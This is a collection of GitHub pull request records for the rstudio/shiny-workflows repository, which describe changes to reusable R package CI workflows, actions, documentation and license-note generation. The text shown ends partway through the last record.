{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/59","ref":59,"title":"Add cross-repo support to routine workflow","description":"## Summary\n- add optional `repository` and `ref` inputs to `routine.yaml`\n- add an optional `token` secret for cross-repo checkout, GitHub API use, and pushes\n- add `push-mode` and `push-branch` so host repositories can push generated commits directly to a target branch on schedule/manual runs\n- document the new routine workflow parameters in the README\n\n## Why\n`routine.yaml` currently assumes it is running in the caller repository and that pushes are driven by the caller event context. This change adds an explicit branch-push mode so a host repository can run routine tasks against another repository and publish the resulting commits.\n\n## Notes\n- This PR is stacked on #57 because it depends on the checkout action repository/ref/token override support.\n- Existing behavior is preserved by default with `push-mode: event`.\n- Cross-repo schedule/manual callers should opt into `push-mode: branch` and pass a token with write access to the target repository.\n\n## Validation\n- parsed `.github/workflows/routine.yaml` as YAML","published_at":"2026-04-14T17:13:45Z","updated_at":"2026-04-14T19:36:59Z","url":"https://github.com/rstudio/shiny-workflows/pull/59","type":"pr","extra":{"author":"karangattu","state":"CLOSED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/58","ref":58,"title":"Add cross-repo support to website workflow","description":"## Summary\n- add optional `repository`, `ref`, and `deploy` inputs to `website.yaml`\n- accept an optional `token` secret for cross-repo checkout and deployment\n- document the new cross-repo website parameters in the README\n\n## Why\n`website.yaml` currently assumes it is running in the caller repository and only deploys on `push` events. This change lets a host repository explicitly target another repository and opt into deployment on schedule/manual runs.\n\n## Notes\n- This PR is stacked on #57 because it depends on the checkout action repository/ref/token override support.\n- Existing behavior is preserved by default: deployment still only happens on `push` unless `deploy: true` is supplied.\n\n## Validation\n- parsed `.github/workflows/website.yaml` as YAML","published_at":"2026-04-14T17:11:55Z","updated_at":"2026-04-14T19:37:10Z","url":"https://github.com/rstudio/shiny-workflows/pull/58","type":"pr","extra":{"author":"karangattu","state":"CLOSED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/57","ref":57,"title":"Allow R-CMD-check to target another repository","description":"## Summary\r\n- add optional `repository` and `ref` inputs to the internal checkout action\r\n- expose those inputs through the reusable `R-CMD-check` workflow\r\n- document how a host repository can run checks for another repository, such as `rstudio/reactlog`\r\n\r\n## Why\r\nThis allows a host repository like `rstudio/shinycoreci` to run the reusable `R-CMD-check` workflow against another repository without inlining the checkout and matrix logic locally.\r\n\r\n## Validation\r\n- parsed `.github/workflows/R-CMD-check.yaml` as YAML\r\n- parsed `.github/internal/checkout/action.yaml` as YAML","published_at":"2026-04-14T16:58:53Z","updated_at":"2026-04-14T19:37:33Z","url":"https://github.com/rstudio/shiny-workflows/pull/57","type":"pr","extra":{"author":"karangattu","state":"CLOSED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/56","ref":56,"title":"Bump GitHub Actions to v5","description":"Update workflow and README references to newer Action major versions. Changed actions/checkout from v4 to v5, actions/setup-node from v4 to v5, and actions/cache restore/save from v4 to v5. Files modified: .github/internal/checkout/action.yaml, .github/workflows/routine.yaml, setup-macOS-dependencies/README.md, setup-phantomjs/README.md, setup-phantomjs/action.yaml, setup-r-package/README.md, and setup-tinytex/README.md. Keeps examples and internal composite action aligned with current upstream releases.","published_at":"2026-03-31T23:38:25Z","updated_at":"2026-04-09T19:48:40Z","url":"https://github.com/rstudio/shiny-workflows/pull/56","type":"pr","extra":{"author":"karangattu","merged_at":"2026-04-09T19:48:40Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/55","ref":55,"title":"Update documentation with missing workflow and action parameters","description":"README files were missing parameters added to workflows and actions over time.\n\n## Updated Main README.md\n\nAdded missing parameters for all three workflows:\n\n- **website.yaml**: `runs-on`, `clean`, `working-directory`\n- **routine.yaml**: `staticimports`, `format-r-code`, `format-description`, `build-readme`, `check-js`, `js-working-directory`, `working-directory`  \n- **R-CMD-check.yaml**: `force-windows-src`, `rtools-40`, `upload-snapshots`, `upload-check-results`, `working-directory`, `check-timeout-minutes`, `check-depends-only`\n\nAll parameters now include default values and descriptions.\n\n## Updated Action READMEs\n\n- **setup-r-package**: Added comprehensive inputs table documenting all 12 parameters (`r-version`, `http-user-agent`, `needs`, `extra-packages`, `cache-version`, `pandoc-version`, `packages`, `rtools-version`, `use-public-rspm`, `pak-version`, `extra-repositories`, `working-directory`) with detailed `pak-version` options explanation\n- **format-r-code**: Added `working-directory` parameter to inputs table\n\nAll parameters verified against actual YAML definitions.\n\n\u003c!-- START COPILOT ORIGINAL PROMPT --\u003e\n\n\n\n\u003cdetails\u003e\n\n\u003csummary\u003eOriginal prompt\u003c/summary\u003e\n\n\u003e \n\u003e ----\n\u003e \n\u003e *This section details on the original issue you should resolve*\n\u003e \n\u003e \u003cissue_title\u003eUpdate documentation\u003c/issue_title\u003e\n\u003e \u003cissue_description\u003eThe readme files are outdated and should be updated with the latest parameters/features\u003c/issue_description\u003e\n\u003e \n\u003e ## Comments on the Issue (you are @copilot in this section)\n\u003e \n\u003e \u003ccomments\u003e\n\u003e \u003c/comments\u003e\n\u003e \n\n\n\u003c/details\u003e\n\n\n\n\u003c!-- START COPILOT CODING AGENT SUFFIX --\u003e\n\n- Fixes rstudio/shiny-workflows#54\n\n\u003c!-- START COPILOT CODING AGENT TIPS --\u003e\n---\n\n💬 We'd love your input! Share your thoughts on Copilot coding agent in our [2 minute survey](https://gh.io/copilot-coding-agent-survey).\n","published_at":"2025-12-23T21:16:06Z","updated_at":"2025-12-23T21:26:41Z","url":"https://github.com/rstudio/shiny-workflows/pull/55","type":"pr","extra":{"author":"copilot-swe-agent","merged_at":"2025-12-23T21:26:41Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/52","ref":52,"title":"feat: Add `check-depends-only: true` support","description":"From https://github.com/rstudio/plumber/issues/1005#issuecomment-3642636110\r\n\r\n\u003e Packages in Suggests should be used conditionally: see 'Writing R Extensions'.\r\n\u003e This needs to be corrected even if the missing package(s) become available.\r\n\u003e It can be tested by checking with _R_CHECK_DEPENDS_ONLY_=true.\r\n\u003e \r\n\u003e The CRAN Team","published_at":"2025-12-11T16:57:39Z","updated_at":"2025-12-11T17:07:24Z","url":"https://github.com/rstudio/shiny-workflows/pull/52","type":"pr","extra":{"author":"schloerke","merged_at":"2025-12-11T17:07:24Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/49","ref":49,"title":"feat(working-directory): Add `working-directory` support","description":"Required for https://github.com/posit-dev/querychat R package","published_at":"2025-05-27T20:09:10Z","updated_at":"2025-05-27T20:11:54Z","url":"https://github.com/rstudio/shiny-workflows/pull/49","type":"pr","extra":{"author":"schloerke","merged_at":"2025-05-27T20:11:54Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/48","ref":48,"title":"chore(config): Use python to determine JSON config","description":"Pains me to do this for an R check, but it avoids a 40s install","published_at":"2025-05-27T20:08:08Z","updated_at":"2025-05-27T20:08:45Z","url":"https://github.com/rstudio/shiny-workflows/pull/48","type":"pr","extra":{"author":"schloerke","merged_at":"2025-05-27T20:08:45Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/45","ref":45,"title":"Windows version updates for R CMD check","description":"This drops R 3.6 and adds R 4.4.","published_at":"2025-04-14T17:52:23Z","updated_at":"2025-04-14T18:21:44Z","url":"https://github.com/rstudio/shiny-workflows/pull/45","type":"pr","extra":{"author":"wch","merged_at":"2025-04-14T18:21:44Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/44","ref":44,"title":"chore(r-cmd-check): Add option to upload snapshots","description":"`r-lib/actions/check-r-package` has an option to upload snapshots, which is helpful if you want to have use CI to generate the variants. This PR just exposes the option in our `r-cmd-check` workflow.\r\n\r\nhttps://github.com/r-lib/actions/tree/v2-branch/check-r-package","published_at":"2025-02-13T19:19:14Z","updated_at":"2025-02-20T03:10:47Z","url":"https://github.com/rstudio/shiny-workflows/pull/44","type":"pr","extra":{"author":"gadenbuie","merged_at":"2025-02-20T03:10:47Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/43","ref":43,"title":"feat: Format R code with `air`","description":"Adds a composite workflow `rstudio/shiny-workflows/format-r-code` that is included into the `routine` workflow to format R code with `air`.\n\nThis composite workflow can be used anywhere with\n\n```yaml\n- name: Format R code\n  uses: rstudio/shiny-workflows/format-r-code@v1\n```\n\nIn the routine workflow, I've put the formatting step behind `inputs.format-r-code`, which is `false` by default. To turn it on:\n\n```yaml\n  routine:\n    uses: rstudio/shiny-workflows/.github/workflows/routine.yaml@feat/format-r-code # @v1\n    with:\n      format-r-code: true\n```\n\nThat lets us opt-in slowly initially or eventually we can change the default value and start formatting everything.\n\nThe composite workflow has additional inputs:\n\n* `version` (default: `latest`) - which version of `air` to use so that we could pin to a specific version.\n* `check` (default: false) - when `\"true\"` calls `air format --check`, which exits with a non-zero status if any files change, no changes are committed\n* `path` (default: `.`) - paths passed to `air format ...`, can be files or directories, e.g. `R inst` to format R files in `R/` and `inst/` only. The current default formats all R files in the repo (aggressive but useful).\n\nI've used this workflow in bslib as a demo: https://github.com/rstudio/bslib/pull/1167","published_at":"2025-01-15T19:17:54Z","updated_at":"2025-01-17T16:43:11Z","url":"https://github.com/rstudio/shiny-workflows/pull/43","type":"pr","extra":{"author":"gadenbuie","merged_at":"2025-01-17T16:43:11Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/42","ref":42,"title":"fix: Run `yarn install` if either build or test are needed","description":"Fixes an issue with the routine workflow where currently `yarn install` is only run if `yarn build` is needed. If `yarn build` **isn't needed** but `yarn test` **is**, then testing will fail because the install step was skipped. ([Example failing workflow run](https://github.com/rstudio/crosstalk/actions/runs/12691931491/job/35376095209?pr=157))\n\nThis PR moves `yarn install` to it's own step that's run if either `build` or `test` are needed.","published_at":"2025-01-09T14:53:16Z","updated_at":"2025-01-09T15:46:15Z","url":"https://github.com/rstudio/shiny-workflows/pull/42","type":"pr","extra":{"author":"gadenbuie","merged_at":"2025-01-09T15:46:15Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/41","ref":41,"title":"fix: Install R (latest release) for config step to work","description":"R isn't included in GitHub runner systems anymore. I'm hoping installing the R release will get us an R binary we can use for the config step.\r\n\r\nRelated failure: https://github.com/rstudio/bslib/actions/runs/12417670297/job/34669134270","published_at":"2024-12-19T19:25:23Z","updated_at":"2024-12-19T19:32:11Z","url":"https://github.com/rstudio/shiny-workflows/pull/41","type":"pr","extra":{"author":"gadenbuie","merged_at":"2024-12-19T19:32:11Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/40","ref":40,"title":"ci: Use cache GHA restore/save for PhantomJS","description":"Original 2x warnings per job\r\n\r\n```\r\nInput 'save-always' has been deprecated with message: save-always does not work as intended and will be removed in a future release.\r\nA separate `actions/cache/restore` step should be used instead.\r\nSee https://github.com/actions/cache/tree/main/save#always-save-cache for more details.\r\n```\r\n\r\nPost merge:\r\n- [x] Bump v1 tag","published_at":"2024-12-11T15:59:10Z","updated_at":"2024-12-11T16:53:11Z","url":"https://github.com/rstudio/shiny-workflows/pull/40","type":"pr","extra":{"author":"schloerke","merged_at":"2024-12-11T16:53:11Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/39","ref":39,"title":"chore(routine): Use `ubuntu-latest`","description":"Switches the routine workflow to run on `ubuntu-latest` instead of `ubuntu-20.04`. \n\nThis seems like a relativel safe change that will reduce our maintenance burden in the future: ideally this avoids us running into issue across repos that use the routine workflow and needing to come back here to update when the version we've pinned falls out of support.\n\nIf I'm wrong about this assumption and pinning the version theoretically saves us some future work, please let me know.","published_at":"2024-11-19T15:59:25Z","updated_at":"2024-11-19T16:19:34Z","url":"https://github.com/rstudio/shiny-workflows/pull/39","type":"pr","extra":{"author":"gadenbuie","merged_at":"2024-11-19T16:19:34Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/38","ref":38,"title":"chore: Bump node version to 22.x","description":"Node 16 is out of support from Node.js.\r\n\r\nSee also: https://github.com/actions/setup-node","published_at":"2024-11-19T15:53:50Z","updated_at":"2024-11-19T16:11:37Z","url":"https://github.com/rstudio/shiny-workflows/pull/38","type":"pr","extra":{"author":"gadenbuie","merged_at":"2024-11-19T16:11:37Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/37","ref":37,"title":"fix(setup-r-package): Set pandoc version without using Rscript","description":"We're seeing failures for [macOS with R 4.4.0](https://github.com/rstudio/bslib/actions/runs/8898510357/job/24435811661) like\r\n\r\n```\r\nRun # Get corresponding pandoc version\r\n  # Get corresponding pandoc version\r\n  pandoc_version \u003c- \"3.x\"\r\n  pandoc_version \u003c- switch(pandoc_version,\r\n    \"default\" =,\r\n    \"3.x\" = \"3.1.11\",\r\n    \"2.x\" = \"2.19.2\",\r\n    pandoc_version\r\n  )\r\n  cat(\"version=\", pandoc_version, \"\\n\", file = Sys.getenv(\"GITHUB_OUTPUT\"), sep = \"\", append = TRUE)\r\n  Error: Rscript: command not found\r\n```\r\n\r\nThis PR should fix the issue by rewriting the code expanding `\"default\"`, `\"3.x\"` and `\"2.x\"` into the full pandoc version in Bash rather than R. Clearly in the above linked failure we're using `Rscript` before its available -- my guess why this isn't a wide-spread problem is that we've been saved so far by caching and that with R 4.4.0 we're facing a cache miss where the problem surfaces.\r\n\r\nWhile here I also renamed the step `pandoc-version` rather than `pandoc` for clarity.","published_at":"2024-04-30T17:09:47Z","updated_at":"2024-04-30T22:29:35Z","url":"https://github.com/rstudio/shiny-workflows/pull/37","type":"pr","extra":{"author":"gadenbuie","merged_at":"2024-04-30T22:29:35Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/33","ref":33,"title":"unlink python's 2to3 so that brew link doesn't fail","description":"We've recently started seeing `brew link` fail to install python3 because `/usr/local/bin/2to3` is present and brew link fails.\n\n* https://github.com/rstudio/shinycoreci/actions/runs/7082248383/job/19273325383#step:12:847\n* https://github.com/rstudio/shinycoreci/actions/runs/7082248383/job/19273322455#step:12:1091\n\nThis PR adds to the install macOS system dependencies group to remove the `2to3` link if it exists. This is apparently [somewhat common](https://github.com/search?q=%22rm+'/usr/local/bin/2to3'%22+path:*.yml\u0026type=code).","published_at":"2023-12-04T15:16:59Z","updated_at":"2023-12-04T20:50:43Z","url":"https://github.com/rstudio/shiny-workflows/pull/33","type":"pr","extra":{"author":"gadenbuie","merged_at":"2023-12-04T20:50:43Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/32","ref":32,"title":"Bump actions/setup-node to avoid deprecation warning","description":"This PR bumps `actions/setup-node` to latest version 4 in order to avoid deprecation warning:\r\n\r\n```\r\nroutine / routine\r\nThe following actions uses node12 which is deprecated and will be forced to run on node16: actions/setup-node@v1.\r\nFor more info: https://github.blog/changelog/2023-06-13-github-actions-all-actions-will-run-on-node16-instead-of-node12-by-default/\r\n```","published_at":"2023-10-31T15:51:24Z","updated_at":"2023-12-04T20:50:15Z","url":"https://github.com/rstudio/shiny-workflows/pull/32","type":"pr","extra":{"author":"deining","merged_at":"2023-12-04T20:50:15Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/31","ref":31,"title":"feat(verify-no-new-commits): Don't fail in PR branches","description":"Fixes #30\n\nAdds `inputs.exit-code` to `verify-no-new-commits` with a default of `\"auto\"`. When `\"auto\"`, the action does not fail in PRs (with an error in the github actions summary), otherwise it fails.\n\n\"In a PR\" is detected by consulting `$GITHUB_HEAD_REF` ([docs](https://docs.github.com/en/actions/learn-github-actions/variables#default-environment-variables)):\n\n\u003e The head ref or source branch of the pull request in a workflow run. This property is only set when the event that triggers a workflow run is either `pull_request` or `pull_request_target`. For example, `feature-branch-1`.\n\nThe idea is that PR failures are almost always due to new commits being added to the branch, degrading the signal of failures in PR branches if cause only by the routine workflow.","published_at":"2023-10-19T19:37:36Z","updated_at":"2023-12-04T21:25:29Z","url":"https://github.com/rstudio/shiny-workflows/pull/31","type":"pr","extra":{"author":"gadenbuie","state":"CLOSED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/29","ref":29,"title":"pak::pkg_deps() only allows for a single package definition","description":"This PR attempts to fix MacOS install errors that started recently appearing in shinycoreci's test results. Here's an example:\r\n\r\nhttps://github.com/rstudio/shinycoreci/actions/runs/6092922510/job/16532934868#step:12:407\r\n\r\nIt appears the error is getting thrown by this line in `pak::pkg_deps()`:\r\n\r\nhttps://github.com/r-lib/pak/blob/f7b0dbafd75a939fb6aa4f61e658a58e435ee5e8/R/package.R#L210-L211\r\n\r\nVia the action workflow modified in this PR\r\n\r\ncc @schloerke","published_at":"2023-09-06T19:08:17Z","updated_at":"2023-09-06T19:09:43Z","url":"https://github.com/rstudio/shiny-workflows/pull/29","type":"pr","extra":{"author":"cpsievert","merged_at":"2023-09-06T19:09:43Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/23","ref":23,"title":"Fix and tweak lock-threads workflow","description":"The lock-threads workflow used an incorrect key for `pr-comment` (thanks, copilot!).\r\n\r\nI also edited the lock message slightly:\r\n\r\n* \"If you believe you have found\" became \"If you have found\" (the hedging sounds a little skeptical)\r\n* Added a link to the Shiny Help page where we share other ways to connect with us.\r\n\r\n\u003e This issue has been automatically locked. If you have found a related problem, please open a new issue (with [a reproducible example](https://community.rstudio.com/t/shiny-debugging-and-reprex-guide/10001) or [feature request](https://github.com/rstudio/shiny/wiki/Writing-Good-Feature-Requests)) and link to this issue.\r\n\u003e \r\n\u003e :raising_hand: Need help? [Connect with us on Discord or Posit Community.](https://shiny.posit.co/r/help.html).","published_at":"2023-07-19T13:22:21Z","updated_at":"2023-07-19T15:43:04Z","url":"https://github.com/rstudio/shiny-workflows/pull/23","type":"pr","extra":{"author":"gadenbuie","merged_at":"2023-07-19T15:43:04Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/20","ref":20,"title":"Add lock-threads workflow","description":"From the readme:\n\n\u003e This action uses the [lock-threads](https://github.com/marketplace/actions/lock-threads) action to lock issues and pull requests that have been inactive for a specified period of time.\n\n\u003e If desired, [you can] update the YAML file to change the default settings. By default, this workflow will lock closed issues when they've been inactive for 60 days. To enable locking of pull requests, comment out or remove the `process-only` option.\n\u003e\n\u003e The workflow runs [once a day at 5:42 AM UTC](https://crontab.guru/#42_5_*_*_*). To change the schedule, update the `cron: '42 5 * * *'` option in the YAML file.","published_at":"2023-07-14T20:45:02Z","updated_at":"2023-07-17T14:49:49Z","url":"https://github.com/rstudio/shiny-workflows/pull/20","type":"pr","extra":{"author":"gadenbuie","merged_at":"2023-07-17T14:49:49Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/18","ref":18,"title":"Update default Pandoc version to 3.1.2","description":"Pandoc 2.x and Pandoc 3.x have some differences in behavior. I noticed this when my local copy of Pandoc did _not_ add leading spaces to bulleted lists, but the GHA copy of Pandoc added two leading spaces, resulting in `routine` check failures.\r\n\r\nThis PR brings all instances of Pandoc in this repo up to date.","published_at":"2023-05-15T18:14:12Z","updated_at":"2023-06-05T15:58:27Z","url":"https://github.com/rstudio/shiny-workflows/pull/18","type":"pr","extra":{"author":"wch","merged_at":"2023-06-05T15:58:27Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/17","ref":17,"title":"Print package install logs","description":"Particularly useful for debugging installation of packages with compiled code","published_at":"2023-05-10T16:10:06Z","updated_at":"2023-05-10T16:41:48Z","url":"https://github.com/rstudio/shiny-workflows/pull/17","type":"pr","extra":{"author":"nealrichardson","merged_at":"2023-05-10T16:41:48Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/15","ref":15,"title":"Add `minimize-man-figures: true` to `routine.yaml`","description":"Originally from https://github.com/rstudio/bslib/pull/521\r\n\r\nThis will automatically minimize images unless the repo opts-out.","published_at":"2023-03-29T16:29:49Z","url":"https://github.com/rstudio/shiny-workflows/pull/15","type":"pr","extra":{"author":"schloerke","state":"OPEN"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/13","ref":13,"title":"Update to actions/checkout@v3","description":"This is to avoid the following warning:\r\n\u003e Node.js 12 actions are deprecated. For more information see: https://github.blog/changelog/2022-09-22-github-actions-all-actions-will-begin-running-on-node16-instead-of-node12/. Please update the following actions to use Node.js 16: actions/checkout@v2","published_at":"2023-01-11T16:44:30Z","updated_at":"2023-01-11T17:00:32Z","url":"https://github.com/rstudio/shiny-workflows/pull/13","type":"pr","extra":{"author":"wch","merged_at":"2023-01-11T17:00:32Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/12","ref":12,"title":"Use Ubuntu 20.04 for R CMD check","description":"GitHub has deprecated the Ubuntu 18.04 runner, so this switches the default to 20.04.","published_at":"2023-01-11T16:38:43Z","updated_at":"2023-01-11T16:44:45Z","url":"https://github.com/rstudio/shiny-workflows/pull/12","type":"pr","extra":{"author":"wch","merged_at":"2023-01-11T16:44:45Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/10","ref":10,"title":"Add missing paren","description":"Seeing an error in CI (e.g. https://github.com/rstudio/shiny/actions/runs/3851754436/jobs/6563259010):\r\n\r\n```\r\nError: Error: unexpected symbol in:\r\n\"      system(paste0(\"echo 'path=\", phantom_path, \"' \u003e\u003e $GITHUB_OUTPUT'\")\r\n      found\"\r\nExecution halted\r\n```","published_at":"2023-01-06T01:30:44Z","updated_at":"2023-01-06T01:34:33Z","url":"https://github.com/rstudio/shiny-workflows/pull/10","type":"pr","extra":{"author":"jcheng5","merged_at":"2023-01-06T01:34:33Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/9","ref":9,"title":"Fix open parenthesis","published_at":"2023-01-05T20:25:48Z","updated_at":"2023-01-06T14:01:58Z","url":"https://github.com/rstudio/shiny-workflows/pull/9","type":"pr","extra":{"author":"Abinashbunty","state":"CLOSED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/8","ref":8,"title":"Use new output files vs printing","description":"Fixes #4\r\nRelated: https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/","published_at":"2023-01-03T22:15:36Z","updated_at":"2023-01-03T22:16:14Z","url":"https://github.com/rstudio/shiny-workflows/pull/8","type":"pr","extra":{"author":"schloerke","merged_at":"2023-01-03T22:16:14Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/3","ref":3,"title":"Use `r-lib/actions@v2`","description":"The checks will fail until I get merge into main branch and tag","published_at":"2022-02-25T18:18:43Z","updated_at":"2022-02-25T18:22:27Z","url":"https://github.com/rstudio/shiny-workflows/pull/3","type":"pr","extra":{"author":"schloerke","merged_at":"2022-02-25T18:22:27Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/69","ref":69,"title":"license-note: Add action to keep LICENSE.note in sync with bundled JS","description":"Closes #28.\n\nAdds a `license-note` composite action and wires it into `routine.yaml`, so the list of bundled JavaScript components in `LICENSE.note` stays current instead of drifting.\n\n## How it works\n\nThe generator resolves each bundled npm package out of the installed `node_modules` and writes its name, license and repository into a marker-delimited block:\n\n```\n### BEGIN bundled JavaScript dependencies (generated by rstudio/shiny-workflows)\n\n* @selectize/selectize: Apache-2.0 (https://github.com/selectize/selectize.js)\n* lit: BSD-3-Clause (https://github.com/lit/lit)\n\n### END bundled JavaScript dependencies\n```\n\n**Opt-in by marker.** If `LICENSE.note` is missing, or exists without a `BEGIN` marker, the action logs a notice and does nothing. A repo opts in once by pasting the marker pair where it wants the list. Moving `@v1` therefore cannot clobber anyone.\n\n**Nothing outside the markers is touched.** That is what makes this usable: `{shiny}`'s note lists jQuery UI, DataTables and a tar implementation taken from R, none of which come from npm, and those entries stay exactly where they are.\n\n**No version numbers.** This file is about licenses. Pinning versions rewrote the block — and fired a PR comment — on every lockfile bump without anything about the licensing having changed. The model files in R Packages (`{diffviewer}`, `{bslib}`) list no versions either.\n\n**A PR comment when the list changes.** A change to what a package redistributes deserves a human's eyes rather than sliding by as one more auto-generated commit. The comment is keyed by a hidden marker and edited in place, so repeated runs update one comment instead of stacking up. It degrades to a warning if the token lacks `pull-requests: write`.\n\n## Which packages get listed\n\nThe obvious source is the direct `dependencies` in `package.json` (what the [reactlog prior art](https://github.com/rstudio/reactlog/blob/83a4958ecda0e362bfbe60858a014ceb9adb8a60/scripts/license_checker.js) used). Checked against real consumers, that is wrong for essentially all of them:\n\n- `{bslib}` has no `dependencies` at all and bundles from `devDependencies`.\n- `{shiny}`'s `dependencies` are almost entirely `@types/*` packages that ship nothing, while the code it actually bundles (`@selectize/selectize`, `lit`) is in `devDependencies` or reached through a `tools/` script.\n\nThe dependencies/devDependencies split describes build roles, not what gets shipped. So a repo names its bundled packages explicitly, with the direct `dependencies` as the fallback:\n\n```json\n{\n  \"licenseNote\": {\n    \"bundled\": [\"@selectize/selectize\", \"lit\"]\n  }\n}\n```\n\n## Following the practices linked in #28\n\n[R Packages](https://r-pkgs.org/license.html#sec-code-you-bundle) asks for more than a component list, so the action also warns (never fails) about the parts it cannot write itself:\n\n- **Copyright holders.** Bundled code needs a `cph` entry in `DESCRIPTION` with a comment saying what they wrote. The action cannot tell *which* person holds copyright over which library, but it warns when a bundled package is never mentioned in `DESCRIPTION` at all — which is the shape the omission takes. Run against `{shiny}` with the manual fix reverted, this independently reproduces the undocumented `lit` found by hand.\n- **Full license texts.** Only the generated block is maintained automatically, so in a note that inlines a full copy of each license the list and the texts below it drift apart as packages come and go. Warns when a listed package has no such section. Notes that instead point at a directory for full copies (`{bslib}`, `{diffviewer}`) have no sections to check and are left alone — detected by the presence of `----` rule headings.\n\nTwo things it deliberately does **not** do: state the package's overall license (the other half of what `LICENSE.note` should contain, but prose the repo owns), and judge whether a component's license is compatible with the package's own — that is a legal judgement, and a CI warning is the wrong place to assert one.\n\n## Verification\n\nNo test suite here, so this was exercised by hand:\n\n- Fixture repo covering scoped packages, the legacy `licenses` array, a package with no declared license, and a package missing from `node_modules`.\n- Real end-to-end runs against checkouts of `{bslib}` (176 packages installed) and `{shiny}` (231).\n- Nested working directory (`pkg/` with JS in `pkg/js/`), including a decoy `node_modules/jquery@9.9.9-WRONG` planted above the repo root: the resolver prefers the in-scope copy and hard-fails rather than reaching past the checkout for an out-of-scope one.\n- Both warnings verified in both directions against `{shiny}`'s real `LICENSE.note` and `DESCRIPTION`, and verified silent for `{bslib}`-style notes.\n- Comment step exercised in all three branches (create, edit-in-place, permission failure) with a stubbed `gh`.\n- `--check` exits 0 when current and 1 when stale; the skip/fail paths behave; both YAML files parse.\n\nRebased onto `main` after #67 landed; the two collisions (a `routine.yaml` input and a README bullet) were purely additive and both kept.\n\nThe companion adoption PR is rstudio/shiny#4426.\n\n**This ships nothing until the `v1` tag moves.**","published_at":"2026-08-14T17:23:30Z","updated_at":"2026-08-14T21:04:08Z","url":"https://github.com/rstudio/shiny-workflows/pull/69","type":"pr","extra":{"author":"schloerke","merged_at":"2026-08-14T21:04:08Z","state":"MERGED"}}
{"source":"github","project_id":"shiny-workflows","target":"rstudio/shiny-workflows","id":"pr/68","ref":68,"title":"examples: Add pkg-r, R-CMD-check, and routine examples","description":"Closes #21. Closes #22.\n\n## #22 — example files for the remaining workflows\n\n`examples/` only had `website.yaml` and `lock-threads.yaml`. Adds the three missing caller workflows:\n\n- **`examples/pkg-r.yaml`** — the combined website + routine + `R CMD check` workflow that the top-level README already shows inline, now installable with `usethis::use_github_action(url = ...)` instead of copy-paste.\n- **`examples/R-CMD-check.yaml`** — the check matrix on its own triggers, for re-running just the matrix without rebuilding the site.\n- **`examples/routine.yaml`** — the housekeeping tasks on their own triggers.\n\nNone of them ship a `schedule:` trigger — consumer repos decide their own cadence. The `cron` and the \"adjust the `8`\" note are also dropped from the top-level README snippet, so it stays in sync with `pkg-r.yaml`. `lock-threads.yaml` keeps its schedule, since that is the point of that workflow.\n\nEach split-out file carries a `NOTE:` reminding the consumer to drop the matching job from `Package checks`, and each is documented in `examples/README.md` and linked from the matching workflow bullet in the top-level `README.md`.\n\n## #21 — `workflow_dispatch` wherever `repository_dispatch` appears\n\nAll existing workflows already satisfied this, so there was nothing to fix in the YAML — the gap was that nothing wrote the rule down. The new `## Example workflows (examples/)` section in `CLAUDE.md` records it, along with the rest of the conventions for adding an example: explicit `repository_dispatch` `types:`, `@v1` refs, the derived-from header comment, no `schedule:`, the `concurrency:` rules (and why `routine` and `website` pushes must *not* be cancelled), and the two docs files to update.\n\nAll example files pass 